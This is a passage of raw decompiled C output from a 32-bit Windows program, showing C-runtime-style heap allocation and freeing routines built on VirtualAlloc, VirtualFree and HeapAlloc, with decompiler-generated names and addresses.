    *(int32_t *)(*v28 + 8) = v24;
    v25 = v24;
    v27 = v26;
    if (*v28 == *v29) {
        char * v50 = (char *)(result + 4 + v23); // 0x403d4a
        char v51 = *v50; // 0x403d4a
        *v50 = v51 + 1;
        int32_t v52 = 0x80000000 >> (v23 & 31);
        if (v23 >= 32) {
            if (v51 == 0) {
                int32_t * v53 = (int32_t *)(a1 + 4); // 0x403d94
                *v53 = *v53 | v52;
            }
            int32_t * v54 = (int32_t *)(result + 196 + 4 * v3); // 0x403da8
            *v54 = *v54 | v52;
            v25 = v24;
            v27 = v26;
        } else {
            if (v51 == 0) {
                int32_t * v55 = (int32_t *)a1; // 0x403d6e
                *v55 = *v55 | v52;
            }
            int32_t * v56 = (int32_t *)(result + 68 + 4 * v3); // 0x403d7d
            *v56 = *v56 | v52;
            v25 = v24;
            v27 = v26;
        }
    }
    goto lab_0x403daa;
  lab_0x403daa:;
    int32_t v57 = v27;
    *(int32_t *)v25 = v57;
    *(int32_t *)(v25 - 4 + v57) = v57;
    int32_t * v58 = (int32_t *)result2; // 0x403db6
    int32_t v59 = *v58 - 1; // 0x403db6
    *v58 = v59;
    if (v59 != 0) {
        // 0x403eb5
        return result2;
    }
    int32_t v60 = g90; // 0x403dbe
    int32_t result3 = a1; // 0x403dc5
    if (v60 != 0) {
        // 0x403dcb
        int32_t lpAddress; // bp-32, 0x403b91
        int32_t v61 = &lpAddress; // 0x403ba2
        *(int32_t *)(v61 - 4) = 0x4000;
        *(int32_t *)(v61 - 8) = 0x8000;
        *(int32_t *)(v61 - 12) = 0x8000 * g88 + *(int32_t *)(v60 + 12);
        int32_t dwSize; // 0x403b91
        int32_t dwFreeType; // 0x403b91
        VirtualFree((int32_t *)lpAddress, dwSize, dwFreeType);
        int32_t * v62 = (int32_t *)(g90 + 8); // 0x403dfd
        *v62 = *v62 | 0x80000000 >> (g88 & 31);
        *(int32_t *)(*(int32_t *)(g90 + 16) + 196 + 4 * g88) = 0;
        char * v63 = (char *)(*(int32_t *)(g90 + 16) + 67); // 0x403e1e
        *v63 = *v63 - 1;
        int32_t v64 = g90; // 0x403e21
        int32_t v65 = v64; // 0x403e2d
        if (*(char *)(*(int32_t *)(v64 + 16) + 67) == 0) {
            int32_t * v66 = (int32_t *)(v64 + 4); // 0x403e2f
            *v66 = *v66 & -2;
            v65 = g90;
        }
        // 0x403e38
        result3 = a1;
        if (*(int32_t *)(v65 + 8) == -1) {
            // 0x403e3e
            *(int32_t *)(v61 - 16) = 0x8000;
            *(int32_t *)(v61 - 20) = 0;
            *(int32_t *)(v61 - 24) = *(int32_t *)(v65 + 12);
            VirtualFree(&g110, (int32_t)&g110, (int32_t)&g110);
            *(int32_t *)(v61 - 28) = *(int32_t *)(g90 + 16);
            *(int32_t *)(v61 - 32) = 0;
            *(int32_t *)(v61 - 36) = g94;
            HeapFree(&g110, (int32_t)&g110, &g110);
            *(int32_t *)(v61 - 40) = 20 * g91 - 20 + g92 - g90;
            *(int32_t *)(v61 - 44) = g90 + 20;
            *(int32_t *)(v61 - 48) = g90;
            function_405a80((int32_t)&g110, (int32_t)&g110, (int32_t)&g110, (int32_t)&g110);
            g91--;
            g89 = g92;
            result3 = g90 < a1 ? a1 - 20 : a1;
        }
    }
    // 0x403ea7
    g88 = v3;
    g90 = result3;
    // 0x403eb5
    return result3;
}

// Address range: 0x403eba - 0x4041c3
int32_t function_403eba(int32_t a1) {
    uint32_t v1 = g92 + 20 * g91; // 0x403ed1
    int32_t v2 = a1 + 23; // 0x403eda
    int32_t v3 = v2 / 16 - 1; // 0x403ee6
    int32_t v4 = 0xffffffff >> (v3 & 31);
    int32_t v5 = v3 > 31 ? v4 : -1;
    int32_t v6 = v3 > 31 ? 0 : v4;
    uint32_t v7 = g89; // 0x403f0a
    int32_t v8 = v7; // 0x403f16
    int32_t v9 = v7; // 0x403f16
    if (v7 < v1) {
        int32_t v10 = *(int32_t *)v8; // 0x403f1b
        v9 = v8;
        while ((v10 & v6 | *(int32_t *)(v8 + 4) & v5) == 0) {
            // 0x403f26
            v8 += 20;
            v9 = v8;
            if (v8 >= v1) {
                // break -> 0x403f31
                break;
            }
            v10 = *(int32_t *)v8;
            v9 = v8;
        }
    }
    int32_t v11 = v9; // 0x403f34
    if (v9 == v1) {
        int32_t v12 = g92; // 0x403f3d
        int32_t v13 = g92; // 0x403f3d
        if (g92 < v7) {
            int32_t v14 = *(int32_t *)(v12 + 4); // 0x403f3f
            v13 = v12;
            while ((*(int32_t *)v12 & v6 || v14 & v5) == 0) {
                int32_t v15 = v12 + 20; // 0x403f4d
                v12 = v15;
                v13 = v15;
                if (v15 >= v7) {
                    // break -> 0x403f54
                    break;
                }
                v14 = *(int32_t *)(v12 + 4);
                v13 = v12;
            }
        }
        // 0x403f54
        v11 = v13;
        if (v13 == v7) {
            int32_t v16 = v13; // 0x403f59
            int32_t v17 = v13; // 0x403f59
            if (v13 < v1) {
                v17 = v16;
                while (*(int32_t *)(v16 + 8) == 0) {
                    int32_t v18 = v16 + 20; // 0x403f61
                    v16 = v18;
                    v17 = v18;
                    if (v18 >= v1) {
                        // break -> 0x403f6c
                        break;
                    }
                    v17 = v16;
                }
            }
            int32_t v19 = v17; // 0x403f6c
            if (v17 == v1) {
                int32_t v20 = g92; // 0x403f75
                int32_t v21 = g92; // 0x403f75
                if (g92 < v7) {
                    v21 = v20;
                    while (*(int32_t *)(v20 + 8) == 0) {
                        int32_t v22 = v20 + 20; // 0x403f7d
                        v20 = v22;
                        v21 = v22;
                        if (v22 >= v7) {
                            // break -> 0x403f84
                            break;
                        }
                        v21 = v20;
                    }
                }
                // 0x403f84
                v19 = v21;
                if (v21 == v7) {
                    int32_t v23 = function_4041c3(v21); // 0x403f86
                    v19 = v23;
                    if (v23 == 0) {
                        // 0x4041be
                        return 0;
                    }
                }
            }
            int32_t v24 = function_404274(v19); // 0x403f95
            int32_t * v25 = (int32_t *)(v19 + 16); // 0x403f9b
            *(int32_t *)*v25 = v24;
            v11 = v19;
            if (*(int32_t *)*v25 == -1) {
                // 0x4041be
                return 0;
            }
        }
    }
    // 0x403faf
    g89 = v11;
    int32_t v26 = *(int32_t *)(v11 + 16); // 0x403fb5
    int32_t * v27 = (int32_t *)v26; // 0x403fb8
    int32_t v28 = *v27; // 0x403fb8
    int32_t v29; // 0x403eba
    int32_t v30; // 0x403eba
    int32_t v31; // 0x403eba
    if (v28 == -1) {
        // 0x403faf
        v29 = v26 + 68;
        v30 = v26 + 196;
        goto lab_0x403fd6;
    } else {
        int32_t v32 = 4 * v28; // 0x403fc2
        int32_t v33 = v26 + 196;
        int32_t v34 = v26 + 68;
        int32_t v35 = *(int32_t *)(v32 + v34); // 0x403fc9
        v29 = v34;
        v30 = v33;
        v31 = v28;
        if ((v35 & v6 || *(int32_t *)(v32 + v33) & v5) != 0) {
            goto lab_0x40400d;
        } else {
            goto lab_0x403fd6;
        }
    }
  lab_0x403fd6:;
    int32_t v36 = *(int32_t *)v29; // 0x403fdc
    v31 = 0;
    if ((v36 & v6 || *(int32_t *)v30 & v5) == 0) {
        int32_t v37 = v29;
        int32_t v38 = 1; // 0x403ff9
        int32_t v39 = v37 + 4; // 0x403fff
        int32_t v40 = *(int32_t *)v39; // 0x404004
        int32_t v41 = v38; // 0x404008
        v31 = v38;
        while ((v40 & v6 | *(int32_t *)(v37 + 132) & v5) == 0) {
            // 0x403ff3
            v37 = v39;
            v38 = v41 + 1;
            v39 = v37 + 4;
            v40 = *(int32_t *)v39;
            v41 = v38;
            v31 = v38;
        }
    }
    goto lab_0x40400d;
  lab_0x40400d:;
    int32_t v42 = 4 * v31; // 0x404021
    int32_t * v43 = (int32_t *)(v42 + v26 + 68); // 0x404021
    int32_t v44 = *v43; // 0x404021
    int32_t v45 = v44 & v6; // 0x404025
    int32_t v46 = v45; // 0x404027
    int32_t v47 = 0; // 0x404027
    if (v45 == 0) {
        // 0x404029
        v46 = *(int32_t *)(v26 + 196 + v42) & v5;
        v47 = 32;
    }
    int32_t v48 = v47; // 0x404038
    if (v46 >= 0) {
        int32_t v49 = 2 * v46; // 0x40403a
        int32_t v50 = v47 + 1; // 0x40403c
        int32_t v51 = v50; // 0x404038
        int32_t v52 = v49; // 0x404038
        v48 = v50;
        while (v49 >= 0) {
            // 0x40403a
            v49 = 2 * v52;
            v50 = v51 + 1;
            v51 = v50;
            v52 = v49;
            v48 = v50;
        }
    }
    int32_t v53 = v2 & -16; // 0x403edd
    int32_t v54 = v26 + 324 + 516 * v31; // 0x404017
    int32_t v55 = v54 + 4; // 0x404042
    int32_t v56 = *(int32_t *)(8 * v48 + v55); // 0x404042
    int32_t * v57 = (int32_t *)v56; // 0x404046
    int32_t v58 = *v57 - v53; // 0x404048
    int32_t v59 = v58 < 1040 ? v58 / 16 - 1 : 63;
    if (v59 == v48) {
        if (v58 == 0) {
            goto lab_0x404180;
        } else {
            // 0x404175
            *v57 = v58;
            *(int32_t *)(v58 + v56 - 4) = v58;
            goto lab_0x404180;
        }
    } else {
        int32_t * v60 = (int32_t *)(v56 + 4); // 0x404064
        int32_t * v61 = (int32_t *)(v56 + 8); // 0x404067
        if (*v60 == *v61) {
            uint32_t v62 = v48 & 31;
            if (v48 > 31) {
                int32_t v63 = -1 - (0x80000000 >> v62);
                int32_t * v64 = (int32_t *)(v26 + 196 + v42); // 0x4040b6
                *v64 = *v64 & v63;
                char * v65 = (char *)(v26 + 4 + v48); // 0x4040b8
                char v66 = *v65 - 1; // 0x4040b8
                *v65 = v66;
                if (v66 == 0) {
                    int32_t * v67 = (int32_t *)(v11 + 4); // 0x4040c5
                    *v67 = *v67 & v63;
                }
            } else {
                int32_t v68 = v62 == 0 ? 0x7fffffff : -1 - (0x80000000 >> v62);
                *v43 = v68 & v44;
                char * v69 = (char *)(v26 + 4 + v48); // 0x40408e
                char v70 = *v69 - 1; // 0x40408e
                *v69 = v70;
                if (v70 == 0) {
                    int32_t * v71 = (int32_t *)v11; // 0x404098
                    *v71 = *v71 & v68;
                }
            }
        }
        // 0x4040cd
        *(int32_t *)(*v61 + 4) = *v60;
        *(int32_t *)(*v60 + 8) = *v61;
        if (v58 == 0) {
            goto lab_0x404180;
        } else {
            int32_t v72 = 8 * v59; // 0x4040ec
            int32_t v73 = v72 + v54; // 0x4040f0
            *v60 = *(int32_t *)(v72 + v55);
            *v61 = v73;
            *(int32_t *)(v73 + 4) = v56;
            *(int32_t *)(*v60 + 8) = v56;
            if (*v60 == *v61) {
                char * v74 = (char *)(v26 + 4 + v59); // 0x40410a
                char v75 = *v74; // 0x40410a
                *v74 = v75 + 1;
                int32_t v76 = 0x80000000 >> (v59 & 31);
                if (v59 > 31) {
                    if (v75 == 0) {
                        int32_t * v77 = (int32_t *)(v11 + 4); // 0x404155
                        *v77 = *v77 | v76;
                    }
                    int32_t * v78 = (int32_t *)(v26 + 196 + v42); // 0x40416c
                    *v78 = *v78 | v76;
                } else {
                    if (v75 == 0) {
                        int32_t * v79 = (int32_t *)v11; // 0x40412b
                        *v79 = *v79 | v76;
                    }
                    // 0x40412d
                    *v43 = *v43 | v76;
                }
            }
            // 0x404175
            *v57 = v58;
            *(int32_t *)(v58 + v56 - 4) = v58;
            goto lab_0x404180;
        }
    }
  lab_0x404180:;
    int32_t v80 = v58 + v56; // 0x404183
    int32_t v81 = v53 | 1; // 0x404185
    *(int32_t *)v80 = v81;
    *(int32_t *)(v53 - 4 + v80) = v81;
    int32_t * v82 = (int32_t *)v54; // 0x404191
    int32_t v83 = *v82; // 0x404191
    *v82 = v83 + 1;
    if (v83 != 0 || v11 != g90) {
        // 0x4041b6
        *v27 = v31;
        // 0x4041be
        return v80 + 4;
    }
    // 0x4041a4
    if (g88 == v31) {
        // 0x4041af
        g90 = 0;
    }
    // 0x4041b6
    *v27 = v31;
    // 0x4041be
    return v80 + 4;
}

// Address range: 0x4041c3 - 0x404274
int32_t function_4041c3(int32_t a1) {
    int32_t v1 = g91; // 0x4041c3
    int32_t v2 = g87; // 0x4041c8
    int32_t v3; // 0x4041c3
    int32_t v4; // 0x4041c3
    int32_t * v5; // 0x4041c3
    if (v1 != v2) {
        // 0x4041c3
        v3 = g92;
        v4 = v1;
        int32_t v6; // bp-8, 0x4041c3
        v5 = &v6;
    } else {
        int32_t v7 = g94; // bp-24, 0x4041e5
        int32_t * v8 = HeapReAlloc((int32_t *)g94, 0, (int32_t *)g92, 4 * (v2 + 80 + 4 * v2)); // 0x4041eb
        if (v8 == NULL) {
            // 0x404271
            return 0;
        }
        int32_t v9 = (int32_t)v8; // 0x4041eb
        g87 += 16;
        g92 = v9;
        v3 = v9;
        v4 = g91;
        v5 = &v7;
    }
    int32_t v10 = (int32_t)v5;
    *(int32_t *)(v10 - 4) = 0x41c4;
    *(int32_t *)(v10 - 8) = 8;
    *(int32_t *)(v10 - 12) = g94;
    int32_t v11 = 20 * v4 + v3; // 0x40421c
    int32_t * v12 = HeapAlloc(&g110, (int32_t)&g110, (int32_t)&g110); // 0x40421f
    int32_t * v13 = (int32_t *)(v11 + 16); // 0x404227
    *v13 = (int32_t)v12;
    if (v12 == NULL) {
        // 0x404271
        return 0;
    }
    // 0x40422c
    *(int32_t *)(v10 - 16) = 4;
    *(int32_t *)(v10 - 20) = 0x2000;
    *(int32_t *)(v10 - 24) = 0x100000;
    *(int32_t *)(v10 - 28) = 0;
    int32_t * memory = VirtualAlloc(&g110, (int32_t)&g110, (int32_t)&g110, (int32_t)&g110); // 0x404239
    *(int32_t *)(v11 + 12) = (int32_t)memory;
    int32_t result; // 0x4041c3
    if (memory != NULL) {
        // 0x40425a
        *(int32_t *)(v11 + 8) = -1;
        *(int32_t *)v11 = 0;
        *(int32_t *)(v11 + 4) = 0;
        g91++;
        *(int32_t *)*v13 = -1;
        result = v11;
    } else {
        // 0x404246
        *(int32_t *)(v10 - 32) = *v13;
        *(int32_t *)(v10 - 36) = 0;
        *(int32_t *)(v10 - 40) = g94;
        HeapFree(&g110, (int32_t)&g110, &g110);
        result = 0;
    }
    // 0x404271
    return result;
}

// Address range: 0x404274 - 0x40436f
int32_t function_404274(int32_t a1) {
    int32_t v1 = *(int32_t *)(a1 + 16); // 0x40427e
    int32_t * v2 = (int32_t *)(a1 + 8); // 0x404281
    uint32_t v3 = *v2; // 0x404281
    int32_t v4 = 0; // 0x404288
    int32_t v5 = v3; // 0x404288
    int32_t result = 0; // 0x404288
    if (v3 >= 0) {
        v5 *= 2;
        v4++;
        result = v4;
        while (v5 >= 0) {
            // 0x40428a
            v5 *= 2;
            v4++;
            result = v4;
        }
    }
    int32_t v6 = v1 + 324 + 516 * result; // 0x40429a
    int32_t v7 = v6; // 0x4042a1
    for (int32_t i = 63; i > 0; i--) {
        int32_t v8 = v7;
        v7 = v8 + 8;
        *(int32_t *)v7 = v8;
        *(int32_t *)(v8 + 4) = v8;
    }
    uint32_t lpAddress = *(int32_t *)(a1 + 12) + 0x8000 * result; // 0x4042b7
    if (VirtualAlloc((int32_t *)lpAddress, 0x8000, 0x1000, 4) == NULL) {
        // 0x40436a
        return -1;
    }
    if (lpAddress < 0xffff9000) {
        int32_t v9 = lpAddress + 16;
        *(int32_t *)(v9 - 8) = -1;
        *(int32_t *)(v9 + 4076) = -1;
        *(int32_t *)(v9 - 4) = 4080;
        *(int32_t *)v9 = v9 + 4092;
        *(int32_t *)(v9 + 4) = v9 - 0x1004;
        *(int32_t *)(v9 + 4072) = 4080;
        int32_t v10 = v9 + 0x1000; // 0x40431b
        while (v9 + 4080 <= lpAddress + 0x7000) {
            // 0x4042e4
            v9 = v10;
            *(int32_t *)(v9 - 8) = -1;
            *(int32_t *)(v9 + 4076) = -1;
            *(int32_t *)(v9 - 4) = 4080;
            *(int32_t *)v9 = v9 + 4092;
            *(int32_t *)(v9 + 4) = v9 - 0x1004;
            *(int32_t *)(v9 + 4072) = 4080;
            v10 = v9 + 0x1000;
        }
    }
    int32_t v11 = v6 + 504; // 0x404323
    *(int32_t *)(v6 + 508) = lpAddress + 12;
    *(int32_t *)(lpAddress + 20) = v11;
    *(int32_t *)(v6 + 512) = lpAddress + 0x700c;
    *(int32_t *)(lpAddress + 0x7010) = v11;
    int32_t v12 = 4 * result + v1;
    *(int32_t *)(v12 + 68) = 0;
    *(int32_t *)(v12 + 196) = 1;
    char * v13 = (char *)(v1 + 67); // 0x404346
    char v14 = *v13; // 0x404346
    *v13 = v14 + 1;
    if (v14 == 0) {
        int32_t * v15 = (int32_t *)(a1 + 4); // 0x404357
        *v15 = *v15 | 1;
    }
    uint32_t v16 = result & 31; // 0x404361
    *v2 = *v2 & (v16 == 0 ? 0x7fffffff : -1 - (0x80000000 >> v16));
    // 0x40436a
    return result;
}

// Address range: 0x40436f - 0x4044b3
int32_t function_40436f(void) {
    // 0x40436f
    int32_t v1; // bp-16, 0x40436f
    int32_t * v2 = &v1; // 0x40437a
    int32_t v3 = &g32; // 0x40437a
    if (g34 != -1) {
        int32_t v4 = g94; // bp-28, 0x40438a
        int32_t * v5 = HeapAlloc((int32_t *)g94, 0, 0x2020); // 0x404390
        v2 = &v4;
        v3 = (int32_t)v5;
        if (v5 == NULL) {
            // 0x4044ae
            return 0;
        }
    }
    int32_t result = v3;
    int32_t v6 = (int32_t)v2;
    *(int32_t *)(v6 - 4) = 4;
    *(int32_t *)(v6 - 8) = 0x2000;
    *(int32_t *)(v6 - 12) = 0x400000;
    int32_t v7 = v6 - 16; // 0x4043b2
    *(int32_t *)v7 = 0;
    int32_t * memory = VirtualAlloc(&g110, (int32_t)&g110, (int32_t)&g110, (int32_t)&g110); // 0x4043b4
    int32_t v8 = v7; // 0x4043ba
    if (memory != NULL) {
        int32_t v9 = (int32_t)memory; // 0x4043b4
        *(int32_t *)(v6 - 20) = 4;
        *(int32_t *)(v6 - 24) = 0x1000;
        *(int32_t *)(v6 - 28) = 0x10000;
        *(int32_t *)(v6 - 32) = v9;
        int32_t * memory2 = VirtualAlloc(&g110, (int32_t)&g110, (int32_t)&g110, (int32_t)&g110); // 0x4043ce
        if (memory2 != NULL) {
            if (result != (int32_t)&g32) {
                // 0x4043ff
                *(int32_t *)result = (int32_t)&g32;
                int32_t * v10 = (int32_t *)(result + 4); // 0x404406
                *v10 = g33;
                g33 = result;
                *(int32_t *)*v10 = result;
            } else {
                // 0x4043e1
                if (g32 == 0) {
                    // 0x4043ea
                    g32 = &g32;
                }
                // 0x4043ef
                if (*(int32_t *)0x4086c4 == 0) {
                    // 0x4043f8
                    g33 = &g32;
                }
            }
            // 0x404414
            *(int32_t *)(result + 20) = v9 + 0x400000;
            int32_t v11 = result + 24; // 0x404423
            *(int32_t *)(result + 12) = result + 152;
            int32_t * v12 = (int32_t *)(result + 16); // 0x404429
            *v12 = v9;
            *(int32_t *)(result + 8) = v11;
            int32_t v13 = v11; // 0x404431
            uint32_t v14 = 0;
            int32_t v15 = v14 + 1; // 0x404442
            *(int32_t *)v13 = v14 >= 16 ? -1 : 240;
            *(int32_t *)(v13 + 4) = 241;
            v13 += 8;
            while (v15 != 1024) {
                // 0x404436
                v14 = v15;
                v15 = v14 + 1;
                *(int32_t *)v13 = v14 >= 16 ? -1 : 240;
                *(int32_t *)(v13 + 4) = 241;
                v13 += 8;
            }
            // 0x404453
            *(int32_t *)(v6 - 36) = 0x10000;
            *(int32_t *)(v6 - 40) = 0;
            *(int32_t *)(v6 - 44) = v9;
            function_405a20((int32_t)&g110, (int32_t)&g110, (int32_t)&g110);
            if (*v12 + 0x10000 <= v9) {
                // 0x4044ae
                return result;
            }
            int32_t v16 = v9;
            *(char *)(v16 + 248) = -1;
            *(int32_t *)v16 = v16 + 8;
            *(int32_t *)(v16 + 4) = 240;
            int32_t v17 = v16 + 0x1000; // 0x40447b
            while (v17 < *v12 + 0x10000) {
                // 0x404468
                v16 = v17;
                *(char *)(v16 + 248) = -1;
                *(int32_t *)v16 = v16 + 8;
                *(int32_t *)(v16 + 4) = 240;
                v17 = v16 + 0x1000;
            }
            // 0x4044ae
            return result;
        }
        // 0x404487
        *(int32_t *)(v6 - 36) = 0x8000;
        *(int32_t *)(v6 - 40) = 0;
        v8 = v6 - 44;
        *(int32_t *)v8 = v9;
        VirtualFree(&g110, (int32_t)&g110, (int32_t)&g110);
    }
    // 0x404495
    if (result != (int32_t)&g32) {
        // 0x40449d
        *(int32_t *)(v8 - 4) = result;
        *(int32_t *)(v8 - 8) = 0;
        *(int32_t *)(v8 - 12) = g94;
        HeapFree(&g110, (int32_t)&g110, &g110);
    }
    // 0x4044ae
    return 0;
}

// Address range: 0x4044b3 - 0x404509
int32_t function_4044b3(int32_t a1) {
    int32_t result = VirtualFree((int32_t *)*(int32_t *)(a1 + 16), 0, 0x8000); // 0x4044ce
    if ((int32_t)g35 == a1) {
        // 0x4044d0
        result = *(int32_t *)(a1 + 4);
        *(int32_t *)&g35 = result;
    }
    if (a1 == (int32_t)&g32) {
        // 0x404500
        g34 = -1;
        return result;
    }
    int32_t * v1 = (int32_t *)(a1 + 4); // 0x4044e0
    int32_t * lpMem = (int32_t *)a1; // 0x4044e3
    *(int32_t *)*v1 = *lpMem;
    *(int32_t *)(*lpMem + 4) = *v1;
    return HeapFree((int32_t *)g94, 0, lpMem);
}

// Address range: 0x404509 - 0x4045cb
int32_t function_404509(int32_t a1) {
    int32_t v1 = a1; // 0x404515
    int32_t v2; // bp-20, 0x404509
    int32_t v3 = &v2; // 0x404515
    int32_t v4 = g33; // 0x404515
    int32_t v5; // 0x404509
    int32_t v6; // 0x404509
    int32_t v7; // 0x404509
    int32_t v8; // 0x404509
    while (true) {
      lab_0x404516:;
        int32_t v9 = v4;
        int32_t v10 = v3;
        int32_t v11 = v5;
        int32_t v12 = v1;
        int32_t * v13 = (int32_t *)(v9 + 16); // 0x404516
        v8 = v12;
        v6 = v11;
        v3 = v10;
        v7 = v9;
        if (*v13 != -1) {
            int32_t * v14 = (int32_t *)(v9 + 12);
            uint32_t v15 = v9 + 0x2010;
            int32_t v16 = v10;
            int32_t v17 = 0x3ff000;
            int32_t v18 = v12;
            int32_t v19 = 0;
            int32_t * v20 = (int32_t *)v15; // 0x40452f
            int32_t v21 = v19; // 0x404535
            int32_t v22 = v18; // 0x404535
            int32_t v23 = v11; // 0x404535
            int32_t v24 = v16; // 0x404535
            int32_t v25; // 0x404546
            bool v26; // 0x404547
            int32_t v27; // 0x40455a
            int32_t v28; // 0x40456b
            if (*v20 == 240) {
                // 0x404537
                *(int32_t *)(v16 - 4) = 0x4000;
                *(int32_t *)(v16 - 8) = 0x1000;
                v25 = v16 - 12;
                *(int32_t *)v25 = *v13 + v17;
                v26 = VirtualFree(&g110, (int32_t)&g110, (int32_t)&g110);
                v21 = v19;
                v22 = v18;
                v23 = 0;
                v24 = v25;
                if (v26) {
                    // 0x404551
                    *v20 = -1;
                    g67--;
                    v27 = *v14;
                    if (v27 - 1 >= v15) {
                        // 0x404565
                        *v14 = v15;
                    }
                    // 0x404568
                    v28 = v18 - 1;
                    v21 = v19 + 1;
                    v22 = v28;
                    v23 = v27;
                    v24 = v25;
                    if (v28 == 0) {
                        // break -> 0x40457d
                        break;
                    }
                }
            }
            int32_t v29 = v24;
            int32_t v30 = v23;
            int32_t v31 = v22;
            int32_t v32 = v21;
            int32_t v33 = v17 - 0x1000; // 0x404570
            int32_t v34 = v15 - 8; // 0x40457b
            int32_t v35 = v32; // 0x40457b
            int32_t v36 = v31; // 0x40457b
            int32_t v37 = v30; // 0x40457b
            int32_t v38 = v29; // 0x40457b
            while (v33 >= 0) {
                // 0x40452f
                v15 = v34;
                v16 = v29;
                v17 = v33;
                v18 = v31;
                v19 = v32;
                v20 = (int32_t *)v15;
                v21 = v19;
                v22 = v18;
                v23 = v30;
                v24 = v16;
                if (*v20 == 240) {
                    // 0x404537
                    *(int32_t *)(v16 - 4) = 0x4000;
                    *(int32_t *)(v16 - 8) = 0x1000;
                    v25 = v16 - 12;
                    *(int32_t *)v25 = *v13 + v17;
                    v26 = VirtualFree(&g110, (int32_t)&g110, (int32_t)&g110);
                    v21 = v19;
                    v22 = v18;
                    v23 = 0;
                    v24 = v25;
                    if (v26) {
                        // 0x404551
                        *v20 = -1;
                        g67--;
                        v27 = *v14;
                        if (v27 - 1 >= v15) {
                            // 0x404565
                            *v14 = v15;
                        }
                        int32_t v39 = v19 + 1; // 0x404568
                        v28 = v18 - 1;
                        v21 = v39;
                        v22 = v28;
                        v23 = v27;
                        v24 = v25;
                        v35 = v39;
                        v36 = 0;
                        v37 = v27;
                        v38 = v25;
                        if (v28 == 0) {
                            // break -> 0x40457d
                            break;
                        }
                    }
                }
                // 0x404570
                v29 = v24;
                v30 = v23;
                v31 = v22;
                v32 = v21;
                v33 = v17 - 0x1000;
                v34 = v15 - 8;
                v35 = v32;
                v36 = v31;
                v37 = v30;
                v38 = v29;
            }
            int32_t v40 = v38;
            int32_t v41 = v37;
            int32_t v42 = v36;
            int32_t v43 = *(int32_t *)(v9 + 4); // 0x404583
            v8 = v42;
            v6 = v41;
            v3 = v40;
            v7 = v43;
            if (v35 != 0) {
                // 0x404588
                v8 = v42;
                v6 = v41;
                v3 = v40;
                v7 = v43;
                if (*(int32_t *)(v9 + 24) == -1) {
                    int32_t * v44 = (int32_t *)(v40 - 4); // 0x40458e
                    *v44 = 1;
                    int32_t v45 = 1; // 0x404593
                    int32_t v46 = v9 + 32;
                    v8 = v42;
                    v6 = v46;
                    v3 = v40;
                    v7 = v43;
                    while (*(int32_t *)v46 == -1) {
                        // 0x404599
                        v45++;
                        int32_t v47 = v46 + 8; // 0x4045a3
                        if (v45 >= 1024) {
                            // 0x4045ad
                            *v44 = v9;
                            int32_t v48 = function_4044b3((int32_t)&g110); // 0x4045ae
                            v8 = v42;
                            v6 = v48;
                            v3 = v40;
                            v7 = v43;
                            goto lab_0x4045b4;
                        }
                        v46 = v47;
                        v8 = v42;
                        v6 = v46;
                        v3 = v40;
                        v7 = v43;
                    }
                }
            }
        }
        goto lab_0x4045b4;
    }
    // 0x4045c6
    int32_t result; // 0x404509
    return result;
  lab_0x4045b4:
    // 0x4045b4
    v4 = v7;
    result = v6;
    if (v4 == g33) {
        return result;
    }
    // 0x4045bc
    v1 = v8;
    v5 = result;
    if (v1 >= 0 != v1 != 0) {
        return result;
    }
    goto lab_0x404516;
}

// Address range: 0x4045cb - 0x404622
int32_t function_4045cb(uint32_t a1, int32_t * a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6) {
    int32_t v1 = &g32;
    if (*(int32_t *)(v1 + 16) < a1) {
        // 0x4045dc
        if (*(int32_t *)(v1 + 20) > a1) {
            // break -> 0x4045e9
            break;
        }
    }
    int32_t v2 = *(int32_t *)v1; // 0x4045e1
    while (v2 != (int32_t)&g32) {
        // 0x4045d7
        v1 = v2;
        if (*(int32_t *)(v1 + 16) < a1) {
            // 0x4045dc
            if (*(int32_t *)(v1 + 20) > a1) {
                // break -> 0x4045e9
                break;
            }
        }
        // 0x4045e1
        v2 = *(int32_t *)v1;
    }
    // 0x40461e
    return 0;
}

// Address range: 0x404622 - 0x404667
int32_t function_404622(int32_t a1, int32_t a2, int32_t a3) {
    int32_t result = a1 + 24 + 8 * (a2 - *(int32_t *)(a1 + 16)) / 0x1000; // 0x404630
    char * v1 = (char *)a3; // 0x404638
    int32_t * v2 = (int32_t *)result; // 0x40463b
    *v2 = *v2 + (int32_t)*v1;
    *v1 = 0;
    *(int32_t *)(result + 4) = 241;
    if (*v2 != 240) {
        // 0x404666
        return result;
    }
    int32_t v3 = g67; // 0x40464f
    g67 = v3 + 1;
    int32_t result2 = result; // 0x40465c
    if (v3 == 31) {
        // 0x40465e
        result2 = function_404509(16);
    }
    // 0x404666
    return result2;
}

// Address range: 0x404667 - 0x40486f
int32_t function_404667(uint32_t a1) {
    // 0x404667
    int32_t v1; // bp-24, 0x404667
    int32_t v2 = &v1; // 0x404674
    int32_t * v3 = (int32_t *)(v2 - 4);
    int32_t * v4 = (int32_t *)(v2 - 8);
    int32_t * v5 = (int32_t *)(v2 - 12);
    int32_t v6 = (int32_t)g35;
    int32_t * v7 = (int32_t *)(v6 + 16); // 0x404675
    int32_t v8 = *v7; // 0x404675
    int32_t * v9; // 0x404667
    int32_t v10; // 0x404667
    uint32_t v11; // 0x4046dd
    int32_t v12; // 0x404667
    int32_t v13; // 0x404667
    int32_t v14; // 0x404667
    int32_t v15; // 0x404667
    int32_t v16; // 0x404667
    int32_t v17; // 0x404667
    int32_t v18; // 0x404667
    int32_t v19; // 0x404667
    int32_t * v20; // 0x404667
    int32_t v21; // 0x404681
    uint32_t v22; // 0x404684
    int32_t v23; // 0x4046e3
    int32_t * v24; // 0x404667
    uint32_t v25; // 0x4046a0
    int32_t * v26; // 0x404667
    uint32_t v27; // 0x4046f0
    int32_t v28; // 0x4046c3
    int32_t * v29; // 0x4046a9
    int32_t v30; // 0x404716
    int32_t * v31; // 0x4046f6
    int32_t v32; // 0x4046b1
    int32_t v33; // 0x404700
    if (v8 != -1) {
        // 0x404681
        v20 = (int32_t *)(v6 + 8);
        v21 = *v20;
        v22 = v6 + 0x2018;
        v10 = v21;
        if (v21 < v22) {
            // 0x4046a0
            v13 = v21;
            v17 = 0x1000 * (0x7fffe8 - v6 + v21) / 8 + v8;
            v24 = (int32_t *)v13;
            v25 = *v24;
            if (v25 >= a1) {
                // 0x4046a9
                v29 = (int32_t *)(v13 + 4);
                if (*v29 > a1) {
                    // 0x4046ae
                    *v3 = a1;
                    *v4 = v25;
                    *v5 = v17;
                    v32 = function_40486f(v17, (int32_t)&g110, (int32_t)&g110);
                    v9 = v24;
                    v12 = v32;
                    v15 = v13;
                    if (v32 != 0) {
                        goto lab_0x404732_2;
                    }
                    // 0x4046bd
